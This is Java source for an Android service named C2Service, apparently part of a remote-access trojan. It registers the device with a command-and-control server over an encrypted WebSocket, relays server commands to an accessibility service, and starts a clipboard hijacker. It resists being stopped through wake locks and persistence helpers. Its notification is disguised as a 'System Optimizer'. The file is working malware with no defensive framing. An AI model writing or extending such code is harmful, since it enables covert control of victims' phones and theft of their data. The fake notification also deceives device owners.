package com.wuzenx;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import com.wuzenx.services.WuzenAccessibilityService;
import com.wuzenx.utils.ClipboardHijacker;
import com.wuzenx.utils.Crypto;
import com.wuzenx.utils.Persistence;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.drafts.Draft_6455;
import org.java_websocket.handshake.ServerHandshake;
import org.json.JSONObject;
import java.net.URI;
import java.util.UUID;

public class C2Service extends Service {
    public static C2Service instance = null;
    
    private WebSocketClient ws = null;
    private Handler handler = new Handler(Looper.getMainLooper());
    private long reconnectDelay = 3000L;
    private String deviceId = "";
    private PowerManager.WakeLock wakeLock = null;
    private ClipboardHijacker clipboardHijacker = null;
    private boolean isRunning = false;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        Config.load(this);
        
        SharedPreferences prefs = getSharedPreferences("wuzenx", MODE_PRIVATE);
        deviceId = prefs.getString("device_id", null);
        if (deviceId == null) {
            deviceId = UUID.randomUUID().toString().replace("-", "").substring(0, 16);
            prefs.edit().putString("device_id", deviceId).apply();
        }
        
        startForeground(1, createNotification());
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "wuzenx:keepalive");
        wakeLock.acquire(10 * 60 * 1000L);
        
        Persistence.keepAlive(this);
        clipboardHijacker = new ClipboardHijacker(this, this);
        connect();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        instance = null;
        isRunning = false;
        if (ws != null) ws.close();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (clipboardHijacker != null) clipboardHijacker.stop();
        Persistence.keepAlive(this);
        super.onDestroy();
    }

    private void connect() {
        if (isRunning) return;
        isRunning = true;
        
        try {
            ws = new WebSocketClient(new URI(Config.SERVER_URL), new Draft_6455()) {
                @Override
                public void onOpen(ServerHandshake handshakedata) {
                    reconnectDelay = 3000L;
                    sendMessage("register", new JSONObject() {{
                        put("deviceId", deviceId);
                        put("info", new JSONObject() {{
                            put("model", Build.MODEL);
                            put("brand", Build.BRAND);
                            put("android", Build.VERSION.RELEASE);
                            put("sdk", Build.VERSION.SDK_INT);
                            put("battery", getBattery());
                            put("device", Build.DEVICE);
                            put("manufacturer", Build.MANUFACTURER);
                            put("product", Build.PRODUCT);
                        }});
                    }}.toString());
                    handler.postDelayed(() -> heartbeat(), 5000L);
                    if (clipboardHijacker != null) clipboardHijacker.start();
                }

                @Override
                public void onMessage(String message) {
                    String decrypted = Crypto.decrypt(message);
                    if (decrypted == null) return;
                    
                    try {
                        JSONObject json = new JSONObject(decrypted);
                        String type = json.optString("type");
                        
                        if (type.equals("heartbeat_ack")) return;
                        
                        if (WuzenAccessibilityService.instance != null) {
                            WuzenAccessibilityService.instance.handleCommand(json);
                        }
                    } catch (Exception ignored) {}
                }

                @Override
                public void onClose(int code, String reason, boolean remote) {
                    isRunning = false;
                    handler.removeCallbacksAndMessages(null);
                    if (clipboardHijacker != null) clipboardHijacker.stop();
                    reconnect();
                }

                @Override
                public void onError(Exception ex) {
                    isRunning = false;
                    reconnect();
                }
            };
            ws.connect();
        } catch (Exception e) {
            isRunning = false;
            reconnect();
        }
    }

    private void reconnect() {
        handler.postDelayed(() -> {
            reconnectDelay = Math.min(reconnectDelay * 2, 60000L);
            connect();
        }, reconnectDelay);
    }

    private void heartbeat() {
        if (ws != null && ws.isOpen()) {
            sendMessage("heartbeat", "");
            handler.postDelayed(() -> heartbeat(), 5000L);
        }
    }

    public void sendMessage(String type, String data) {
        if (ws == null || !ws.isOpen()) return;
        try {
            JSONObject msg = new JSONObject();
            msg.put("type", type);
            if (type.equals("register")) {
                ws.send(Crypto.encrypt(data));
            } else {
                msg.put("deviceId", deviceId);
                msg.put("data", data);
                ws.send(Crypto.encrypt(msg.toString()));
            }
        } catch (Exception ignored) {}
    }

    public void sendMessage(String type, JSONObject data) {
        sendMessage(type, data.toString());
    }

    private int getBattery() {
        try {
            Intent i = registerReceiver(null, new Intent(Intent.ACTION_BATTERY_CHANGED));
            if (i == null) return -1;
            int level = i.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
            int scale = i.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
            if (level >= 0 && scale > 0) return level * 100 / scale;
        } catch (Exception ignored) {}
        return -1;
    }

    private Notification createNotification() {
        String ch = "wuzenx_service";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(ch, "System Service",
                NotificationManager.IMPORTANCE_MIN);
            channel.setShowBadge(false);
            channel.enableVibration(false);
            channel.setSound(null, null);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
        }
        
        Notification.Builder builder = new Notification.Builder(this, ch)
            .setContentTitle("System Optimizer")
            .setContentText("Optimizing device performance...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            builder.setForegroundServiceBehavior(Notification.FOREGROUND_SERVICE_IMMEDIATE);
        }
        
        return builder.build();
    }
}
